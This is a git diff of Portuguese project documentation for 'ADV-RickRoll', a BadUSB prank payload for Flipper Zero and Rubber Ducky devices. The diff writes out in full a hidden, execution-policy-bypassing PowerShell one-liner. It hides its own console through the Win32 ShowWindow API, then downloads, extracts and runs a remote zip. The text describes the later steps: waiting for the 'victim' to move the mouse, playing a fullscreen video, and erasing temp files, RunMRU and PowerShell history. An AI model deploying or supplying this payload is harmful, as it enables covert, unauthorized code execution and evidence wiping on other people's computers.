@@ -56,18 +56,18 @@ Abaixo estão detalhadas todas as alterações efetuadas em cada arquivo do proj
   - A nova versão corrigida e aprimorada do `rr.ps1`.
 
 ### 3.3. [ADV-RickRoll.txt](file:///home/juca/Documentos/ADV-RickRoll/ADV-RickRoll.txt)
-* O payload DuckyScript foi atualizado com a nova URL de download público permanente:
+* O payload DuckyScript foi unificado e enriquecido: incorpora agora a chamada Win32 `ShowWindow` para ocultação imediata e as rotinas diretas de download e extração em linha única:
   ```duckyscript
-  STRING powershell -w h -NoP -NonI -Ep Bypass $D="$env:tmp";irm -Uri 'https://raw.githubusercontent.com/xJCPMSx/ADV-RickRoll/main/rr.zip' -O "$D\rr.zip";Expand-Archive "$D\rr.zip" -Des $D\rr -Force;. "$D\rr\rr.ps1"
+  STRING powershell -w h -NoP -NonI -Ep Bypass "$i='[DllImport(\"user32.dll\")] public static extern bool ShowWindow(int handle, int state);';add-type -name win -member $i -namespace native -ErrorAction SilentlyContinue;[native.win]::ShowWindow(([System.Diagnostics.Process]::GetCurrentProcess() | Get-Process).MainWindowHandle, 0);Set-Location $env:tmp;irm -Uri 'https://raw.githubusercontent.com/xJCPMSx/ADV-RickRoll/main/rr.zip' -O rr.zip;Expand-Archive rr.zip -Des rr -Force;. .\rr\rr.ps1"
   ```
-* Mantida a compatibilidade total com dispositivos BadUSB (Flipper Zero, Rubber Ducky, etc.).
+* Mantida a compatibilidade total com dispositivos BadUSB (Flipper Zero, Rubber Ducky, etc.) e incluído comentário de instrução para execução direta no Windows (`Win + R`).
 
-### 3.4. [StageOne.txt](file:///home/juca/Documentos/ADV-RickRoll/StageOne.txt)
-* Atualizado o comando auxiliar PowerShell para também apontar para a nova URL no GitHub Raw.
+### 3.4. StageOne.txt (Unificado e Removido)
+* O arquivo `StageOne.txt` foi absorvido e unificado diretamente dentro do `ADV-RickRoll.txt`, deixando de existir como arquivo avulso no repositório.
 
 ### 3.5. [ReadMe.md](file:///home/juca/Documentos/ADV-RickRoll/ReadMe.md)
-* Atualizado o `README` com a nova URL pública do GitHub.
-* Adicionada a seção **Modifications & Improvements** documentando as melhorias técnicas.
+* Atualizado o `README` com a nova URL pública do GitHub e com o comando unificado.
+* Adicionada a seção **Modifications & Improvements** documentando as melhorias técnicas e a unificação do `StageOne.txt`.
 * Atualizados os créditos e autoria da recriação.
 
 ---
@@ -88,14 +88,55 @@ Abaixo estão detalhadas todas as alterações efetuadas em cada arquivo do proj
 ## 5. Como Testar e Utilizar
 
 ### Execução Direta no Windows (via Caixa Executar `Win + R`)
-Copie e cole o comando a seguir na janela Executar do Windows:
+Copie e cole o comando unificado a seguir na janela Executar do Windows:
 ```powershell
-powershell -w h -NoP -NonI -Ep Bypass $D="$env:tmp";irm -Uri 'https://raw.githubusercontent.com/xJCPMSx/ADV-RickRoll/main/rr.zip' -O "$D\rr.zip";Expand-Archive "$D\rr.zip" -Des $D\rr -Force;. "$D\rr\rr.ps1"
+powershell -w h -NoP -NonI -Ep Bypass "$i='[DllImport(\"user32.dll\")] public static extern bool ShowWindow(int handle, int state);';add-type -name win -member $i -namespace native -ErrorAction SilentlyContinue;[native.win]::ShowWindow(([System.Diagnostics.Process]::GetCurrentProcess() | Get-Process).MainWindowHandle, 0);Set-Location $env:tmp;irm -Uri 'https://raw.githubusercontent.com/xJCPMSx/ADV-RickRoll/main/rr.zip' -O rr.zip;Expand-Archive rr.zip -Des rr -Force;. .\rr\rr.ps1"
 ```
 
 ### O que acontece durante a execução:
-1. O PowerShell abre minimizado/oculto e baixa o pacote `rr.zip` diretamente do GitHub.
-2. O pacote é descompactado na pasta temporária.
-3. O script ativa a função `Target-Comes`, alternando o CapsLock a cada 3 segundos e aguardando a movimentação do mouse pela vítima.
-4. Assim que o mouse se mexe, a janela em tela cheia do WPF carrega o vídeo com volume em 100%.
-5. Ao término ou fechamento, todos os rastros temporários, histórico do RunMRU e do PowerShell são apagados.
+1. O PowerShell abre e, antes mesmo de iniciar qualquer download ou processamento pesado, invoca nativamente a API Win32 `ShowWindow` para ocultar o console (evitando qualquer flash visual).
+2. O diretório de trabalho é alterado para a pasta temporária (`$env:tmp`).
+3. O pacote `rr.zip` é baixado diretamente do GitHub Raw e descompactado na pasta temporária `rr\`.
+4. O script ativa a função `Target-Comes`, alternando o CapsLock a cada 3 segundos e aguardando a movimentação do mouse pela vítima.
+5. Assim que o mouse se mexe, a janela em tela cheia do WPF carrega o vídeo com volume em 100%.
+6. Ao término ou fechamento, todos os rastros temporários, histórico do RunMRU e do PowerShell são apagados.
+
+---
+
+## 6. Documentação da Unificação do StageOne
+
+### 6.1. Motivação e Diagnóstico
+No design original do projeto, a execução era dividida em múltiplos estágios:
+* Estágio 0: Keystroke injection (DuckyScript) que chamava uma URL remota.
+* Estágio 1 (`StageOne.txt`): Script intermediário que ocultava o console e baixava o ZIP principal.
+* Estágio 2 (`rr.zip` -> `rr.ps1`): O script final com interface WPF.
+
+Manter `StageOne.txt` como um arquivo separado no repositório era desnecessário e gerava duplicação de comandos, além de exigir duas requisições HTTP caso a arquitetura de estágios fosse mantida.
+
+### 6.2. Modificações Realizadas
+1. **Unificação do Payload (`ADV-RickRoll.txt`):**
+   - Incorporou a declaração da Win32 API (`user32.dll!ShowWindow`) com `Add-Type`.
+   - Adicionou a chamada antecipada para ocultar a janela imediatamente.
+   - Navega para `$env:tmp` de forma segura e faz o download direto de `rr.zip`, descompactando em pasta dedicada `rr\` e acionando `.\rr\rr.ps1`.
+   - O payload permanece totalmente compatível com a sintaxe DuckyScript para USB Rubber Ducky e Flipper Zero.
+
+2. **Remoção de Arquivo Residual (`StageOne.txt`):**
+   - O arquivo `StageOne.txt` foi completamente absorvido e removido do repositório (`git rm StageOne.txt`).
+
+3. **Proteção contra Tipos Duplicados no `rr.ps1`:**
+   - No PowerShell, definir o mesmo tipo .NET (`native.win`) mais de uma vez na mesma sessão via `Add-Type` causa o erro `The type name 'native.win' already exists`.
+   - Para garantir total idempotência, o bloco inicial de `rr.ps1` foi atualizado para verificar se o tipo já existe antes de compilá-lo:
+     ```powershell
+     if (-not ('native.win' -as [type])) {
+         $i = '[DllImport("user32.dll")] public static extern bool ShowWindow(int handle, int state);';
+         add-type -name win -member $i -namespace native -ErrorAction SilentlyContinue;
+     }
+     [native.win]::ShowWindow(([System.Diagnostics.Process]::GetCurrentProcess() | Get-Process).MainWindowHandle, 0);
+     ```
+
+4. **Reconstrução do Pacote `rr.zip`:**
+   - O arquivo `rr.zip` foi reempacotado com compressão Deflate nível 9 contendo o novo `rr.ps1` corrigido e o vídeo `rr.mp4`.
+
+5. **Atualização da Documentação (`ReadMe.md` e `DOCUMENTACAO.md`):**
+   - Atualizados os exemplos de comando de execução para o formato unificado.
+   - Documentada a remoção e o motivo da unificação.
